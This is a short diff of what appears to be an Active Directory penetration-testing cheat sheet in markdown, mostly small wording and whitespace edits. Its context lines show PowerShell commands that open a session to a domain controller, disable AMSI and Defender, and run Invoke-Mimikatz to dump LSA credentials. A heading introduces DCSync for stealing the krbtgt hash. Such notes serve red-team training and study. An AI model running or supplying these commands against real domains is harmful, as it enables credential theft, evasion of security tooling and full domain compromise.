@@ -56,14 +56,12 @@ $sess = New-Session -Computername dc.local
 Disable AMSI/Defender in that session
 Exit
 Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1
-Enter-Pssession  -session $sess
+Enter-Pssession -session $sess
 Invoke-Mimikatz -command '"lsadump:lsa /patch
 ```
 {% endcode %}
 
-
-
-**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
+**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs (or any user with replication rights on the domain object):**
 
 {% code overflow="wrap" %}
 ```powershell
